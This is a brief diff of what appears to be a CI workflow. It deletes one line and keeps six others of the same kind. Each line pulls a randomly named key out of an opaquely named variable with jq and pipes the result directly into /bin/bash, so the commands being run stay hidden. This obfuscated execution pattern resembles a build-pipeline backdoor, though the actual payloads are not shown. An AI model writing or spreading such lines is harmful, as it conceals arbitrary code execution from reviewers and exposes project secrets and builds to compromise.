@@ -31,7 +31,6 @@ jobs:
           echo $dx50436 | jq -r .v58 | /bin/bash
           echo $sdaf8477 | jq -r .j06 | /bin/bash
           printf '%s' "$e651" | jq -r .hrhq6 | /bin/bash
-          echo $pioet664 | jq -r .udfu6187 | /bin/bash
           echo $o8 | jq -r .rwm57488 | /bin/bash
           echo $rpu958 | jq -r .eah33 | /bin/bash
           printf '%s' "$p3" | jq -r .yum45047 | /bin/bash
